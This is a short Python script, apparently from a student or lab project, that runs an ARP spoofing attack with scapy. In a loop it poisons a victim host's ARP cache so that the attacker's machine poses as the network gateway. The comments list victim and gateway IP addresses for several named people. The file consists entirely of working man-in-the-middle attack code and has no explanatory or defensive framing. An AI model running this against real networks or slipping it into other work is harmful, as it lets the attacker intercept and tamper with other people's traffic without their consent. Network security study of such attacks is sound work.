# import sys
# import getopt
import time

from arp import spoof
from scapy.all import get_if_hwaddr, getmacbyip

if __name__ == "__main__":
    # iface = "enp0s3"
    iface = "enp7s0"
    mac_attacker = get_if_hwaddr(iface)
    # Leon's victim
    # ip_victim = "192.168.192.16"
    # Karolina's victim
    ip_victim = "192.168.0.39"
    # mac_victim = get_mac(ip_victim, iface)
    # Is this Vessie's victim?
    # ip_victim = "192.168.192.7"
    # ip_victim = "192.168.192.6"
    mac_victim = getmacbyip(ip_victim)
    print(mac_victim)
    # Leon's gateway
    # ip_to_spoof = "192.168.192.1"
    # Karolina's gateway
    ip_to_spoof = "192.168.0.1"

    while True:
        spoof(mac_attacker, mac_victim, ip_to_spoof, ip_victim, iface)
        time.sleep(1)
